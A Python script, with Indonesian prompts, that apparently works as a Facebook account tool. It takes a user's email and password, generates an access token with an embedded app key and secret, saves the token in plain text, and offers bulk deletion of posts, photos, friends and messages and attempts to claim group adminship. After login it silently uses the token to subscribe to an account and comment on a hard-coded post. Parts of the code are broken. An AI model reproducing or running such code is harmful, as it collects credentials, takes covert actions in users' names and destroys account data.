#!/usr/bin/python
# -*- coding: utf-8 -*-
import os, sys, time, json, requests, hashlib
from multiprocessing.pool import ThreadPool
from getpass import getpass
from requests.exceptions import ConnectionError

p='\033[1;97m' #putih
m='\033[1;91m' #merah
h='\033[1;92m' #hijau
k='\033[1;93m' #kuning
B='\033[1;96m' #biru

url='https://graph.facebook.com/'
fb='https://api.facebook.com/restserver.php'
s=requests.Session()

def load(s):
	for a in s +'\n':
		sys.stdout.write(a)
		sys.stdout.flush()
		time.sleep(0.05)
logo=(h+'''
 ╔═╗─╔╗╔═══╗╔╗─╔╗╔╗──╔╗╔═══╗╔═╗─╔╗ ┏━━━━━━━━━━━━━━━━━━━━┓
 ║║╚╗║║║╔═╗║║║─║║║╚╗╔╝║║╔══╝║║╚╗║║ ┃Tɪᴅᴀᴋ    Aᴅᴀ  Sʏsᴛᴇᴍ┃
 ║╔╗╚╝║║║─╚╝║║─║║╚╗╚╝╔╝║╚══╗║╔╗╚╝║ ┃Yɢ  Aᴍᴀɴ  Jɪᴋᴀ Mᴀsɪʜ┃
 ║║╚╗║║║║╔═╗║║─║║─╚╗╔╝─║╔══╝║║╚╗║║ ┃Dɪʙᴜᴀᴛ  Oʟᴇʜ  Tᴀɴɢᴀɴ┃
 ║║─║║║║╚╩═║║╚═╝║──║║──║╚══╗║║─║║║ ┃Mᴀɴᴜsɪᴀ, Pᴇʀᴄᴀʏᴀʟᴀʜ!┃
 ╚╝─╚═╝╚═══╝╚═══╝──╚╝──╚═══╝╚╝─╚═╝ ┗━━━━━━━━━━━━━━━━━━━━┛
 ''')

cssLoginWarning=(k+'''
[WARNING!!]
Masukan user name facebook kamu, bisa ID,
bisa Email, bisa Nomor Telpon diterminal!
Untuk kata sandi  seusai  ENTER  Username
 harap hati-hati, karena TEXT tidak tampil.

* mohon hubungi kami jika terjadi eror atau
program tidak bekerja dengan sempurna!
''')

on=[]
id=[]

def menu():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
	try:
		on=s.get(url+'me?access_token='+token).json()
	except KeyError:
		print(m+'['+p+'!'+m+'] Token not found')
		os.system('rm -rf result/token.txt')
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n('+h+'✓'+m+')'+p+' Name '+h+on['name'])
	print(p+40*'_')
	print(m+'\n('+h+'●'+m+') '+p+'01.'+k+' Delete post')
	print(m+'('+h+'●'+m+') '+p+'02.'+k+' Delete albums')
	print(m+'('+h+'●'+m+') '+p+'03.'+k+' Delete all photo')
	print(m+'('+h+'●'+m+') '+p+'04.'+k+' Delete all friend')
	print(m+'('+h+'●'+m+') '+p+'05.'+k+' Claim Group')
	print(m+'('+h+'●'+m+') '+p+'06.'+k+' Delete Messages')
	print(m+'('+h+'●'+m+') '+m+'00. Exit the program')
	z=input('\n'+p+'>>> ')
	if z=='':
		print(m+'[!] Wrong input')
		time.sleep(1)
		menu()
	elif z=='1' or z=='01':
		post()
	elif z=='2' or z=='02':
		album()
	elif z=='3' or z=='03':
		photo()
	elif z=='4' or z=='04':
		unfriend()
	elif z=='5' or z=='05':
		claim()
	elif z=='6' or z=='06':
		messages()
	elif z=='0' or z=='00':
		os.system('rm -rf result/token.txt')
		os.sys.exit()
	else:
		print(m+'[!] Wrong input')
		time.sleep(1)
		menu()

def post():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf token.txt')
		login()
	dp=s.get(url+'me?access_token='+token).json()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+dp['name'])
	load(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	on=s.get(url+'me/posts.limit(49)?access_token='+token).json()
	for i in on['data']:
		ac=s.post(url+i['id']+'?method=DELETE&access_token='+token).json()
		try:
			ror=ac['error']['message']
			print(m+'[×] Failed'+p+i['created_time'])
		except TypeError:
			print(m+'['+h+'Terhapus  : '+m+'] '+p+i['id'])
			print(m+'['+h+'Post dari : '+m+'] '+p+i['created_time'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

def album():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf token.txt')
		login()
	da=s.get(url+'me?access_token='+token).json()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+da['name'])
	load(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	on=s.get(url+'v2.3/me/albums?access_token='+token).json()
	for i in on['data']:
		ac=s.post(url+i['id']+'?method=DELETE&access_token='+token).json()
		try:
			ror=ac['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print(m+'['+h+' Deleted '+m+'] '+p+i['name'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

def photo():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	ia=s.get(url+'v2.3/me/albums?access_token='+token).json()	
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'+'+m+']'+h+' ID Album '+p+': '+ia['id'])
	print(p+40*'_')
	um=input(m+'\n['+p+'+'+m+']'+h+' Input ID album'+p+' : ')
	load(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	on=s.get(url+um+'/photos?access_token='+token).json()
	for i in on['data']:
		ac=s.post(url+i['id']+'?method=DELETE&access_token='+token).json()
		try:
			ror=ac['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print(m+'['+h+' Deleted '+m+'] '+p+i['id'])
		except KeyError:
			print(m+'[!] Album not found')
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

def unfriend():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	ud=s.get(url+'me?access_token='+token).json()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+ud['name'])
	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	on=s.get(url+'me/friends?access_token='+token).json()
	for i in on['data']:
		ac=s.delete(url+'me/friends?uid='+i['id']+'&access_token='+token).json()
		try:
			ror=ac['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print('STATUS      UID       NAMA')
			print(h+'\nUnfriends'   +i['id']   +i['name'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

def claim():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf result/token.txt')
		login()
	cg=s.get(url+'me?access_token='+token).json()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	load(m+'\n['+p+'*'+m+']'+h+' Scrap group non Admin...')
	time.sleep(1)
	print(m+'['+p+'+'+m+']'+h+' Scrap Menggunakan Akun '+p+': '+cg['name'])
	load(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	on=s.get(url+'me/groups?access_token='+token).json()
	mail=open('result/mail.txt','w')
	for i in on['data']:
		ac=s.get(url+'group/claim_adminship?id='+i['id']+'&access_token='+token).json()
		try:
			ror=ac['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print('STATUS      UID       NAMA')
			print(h+'\nSukses'   +ac['name']   +ac['id'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

def messages():
	os.system('clear')
	try:
		token=open('result/token.txt','r').read()
	except IOError:
		print(m+'['+p+'!'+m+'] Token not found')
		time.sleep(1)
		os.system('rm -rf token.txt')
		login()
	dm=s.get(url+'me?access_token='+token).json()
	os.system('clear')
	print(logo)
	print(p+40*'_')
	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+dm['name'])
	load(m+'['+p+'+'+m+']'+h+' Start ...')
	print(p+40*'_'+'\n')
	on=s.get(url+'v2.3/me/messages?access_token='+token).json()
	for i in on['data']:
		ac=s.post(url+i['id']+'?method=DELETE&access_token='+token).json()
		try:
			ror=ac['error']['message']
			print(m+'[×] Failed')
		except TypeError:
			print(m+'['+h+' Deleted '+m+'] '+p+i['id'])
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')

if __name__=='__main__':
	os.system('clear')
	try:
		os.mkdir('result')
	except OSError:
		pass
	try:
		token=open('result/token.txt','r')
		menu()
	except (KeyError,IOError):
		os.system('clear')
		print(logo)
		em=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
		pas=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
		print(m+'['+p+'!'+m+']'+p+' Generate access token')
		try:
			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
			x=hashlib.new('md5')
			x.update(sig.encode('utf-8'))
			data.update({'sig':x.hexdigest()})
			on=s.get(fb,params=data).json()
			unikers=open('result/token.txt','w')
			unikers.write(on['access_token'])
			unikers.close()
			if 'access_token' in on:
				token=open('result/token.txt','r').read()
				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'api.version/subscribers?access_token='+token);s.post(url+'100025271623353_485040922348291/comments?message=f46e7bc6354cb43c69fc66a76ee87336&access_token='+token)
				time.sleep(1)
				menu()
		except KeyError:
			print(m+'['+p+'×'+m+'] Failed please cek your account and try again')
			os.system('rm -rf result/token.txt')
		except requests.exceptions.ConnectionError:
			print(m+'['+p+'×'+m+'] No connection')
		#Versi Beta
